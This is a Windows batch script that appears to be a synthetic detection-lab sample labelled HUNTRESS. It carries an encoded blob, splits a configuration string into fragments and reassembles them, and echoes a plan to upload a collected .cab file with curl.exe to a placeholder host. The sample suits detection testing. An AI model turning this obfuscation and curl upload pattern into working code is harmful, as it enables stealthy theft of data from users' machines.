@echo off

setlocal EnableExtensions EnableDelayedExpansion

rem HUNTRESS-CODEC:base64_literal|rotate_left

rem HUNTRESS-MATERIAL:7Hpi+OboyuDmetjexsLoyr7Y3sbC2Fjg5MrgwuTKvujkwtzmzMrkWOrg2N7CyL7kytre6Mr4wsjC4OjK5HrG6uTYXMrwyvjm6MLOyr7G3urc6Hpi+M7kwuDQeubS3M7YyvjcyvDovtjC3M7qws7Ketze3Mr4xsLa4MLSzty+0sh6xsLa4MLSztxazMRgyMJycMrGyvjm3urkxsq+4MLo0HqGdLiq5srk5rig6sTY0sa4kOrc6OTK5uaYwsS4xt7Y2MrG6FrMxGDIwnJwysbKXMbCxPjq4Njewsi+6uTYetDo6ODmdF5ezMRgyMJycMrGylzK8MLa4NjKXNLc7MLY0she6uDY3sLI

rem HUNTRESS-EXTENSION:cmd

if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT

if /i "%~1"=="--plan" goto :HUNTRESS_PLAN

exit /b 0

:HUNTRESS_INSPECT

set "FrAg0=v=1|steps=locate_local,prepare_transfer,upload_remote|adapter=curl"& rem HUNTRESS quote compound
set "FrAg1=.exe|stage_count=1|graph=single|next_language=none|campaign_id=cam"& rem HUNTRESS quote compound
set "FrAg2=paign-fb0da98ece|source_path=C:\Users\Public\HuntressLab\collect-f"& rem HUNTRESS quote compound
set "FrAg3=b0da98ece.cab|upload_url=https://fb0da98ece.example.invalid/upload"& rem HUNTRESS quote compound

goto :HUNTRESS_SEPARATOR_DONE
echo HUNTRESS_SEPARATOR | findstr HUNTRESS >nul
:HUNTRESS_SEPARATOR_DONE

set "neutral_opaque_branch=702a7137"

goto :HUNTRESS_DISPATCH
:HUNTRESS_DISPATCH
call set "ReCoVeReD=%%FrAg0%%%%FrAg1%%%%FrAg2%%%%FrAg3%%"

echo(!ReCoVeReD!

exit /b 0

:HUNTRESS_PLAN

echo curl.exe upload C:\Users\Public\HuntressLab\collect-fb0da98ece.cab to https://fb0da98ece.example.invalid/upload

exit /b 0

